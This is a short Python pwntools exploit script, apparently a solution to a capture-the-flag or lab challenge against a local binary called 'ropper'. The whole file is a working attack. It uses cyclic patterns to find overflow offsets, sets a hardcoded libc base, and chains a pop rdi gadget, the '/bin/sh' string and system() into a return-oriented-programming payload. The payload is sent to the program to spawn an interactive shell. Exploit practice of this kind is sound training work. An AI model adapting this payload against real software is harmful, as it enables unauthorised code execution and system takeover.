from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
path = "./ropper"


#io = process(path)
io = gdb.debug(path, '''
        b main
        '''
        )

e = ELF(path)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

libc.address = 0x00007ffff7d8b000 
rdi_gadget = libc.address + 0x000000000002a3e5 # pop rdi; ret
ret_gadget = rdi_gadget + 1
binsh = next(libc.search(b"/bin/sh"))

bin_echo = 0x402060

cycle = cyclic(500)
offset = cyclic_find(0x62616162)
cmd_offset = cyclic_find(0x6161617261616171)
ret_offset = offset - (cmd_offset+8)

payload = b"d" * cmd_offset + p64(bin_echo) + b"A" * ret_offset + p64(ret_gadget) + p64(rdi_gadget) + p64(binsh) + p64(libc.symbols["system"])

io.recvuntil(b"Enter your input:\n")
io.sendline(payload)

io.interactive()

